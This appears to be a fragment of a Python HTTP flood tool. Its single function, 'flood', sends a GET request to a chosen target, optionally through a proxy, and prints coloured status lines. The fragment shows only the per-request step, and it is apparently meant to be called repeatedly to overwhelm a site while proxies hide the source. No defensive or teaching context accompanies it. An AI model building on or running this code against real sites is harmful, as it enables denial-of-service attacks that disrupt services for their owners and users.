import requests
from colorama import Fore

def flood(target, proxy=None):
    try:
        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None
        response = requests.get(target, proxies=proxies, timeout=5)
        print(f"{Fore.GREEN}Request sent to {target} via {proxy if proxy else 'direct'}")
    except Exception as e:
        print(f"{Fore.RED}Failed to send request to {target}: {str(e)}")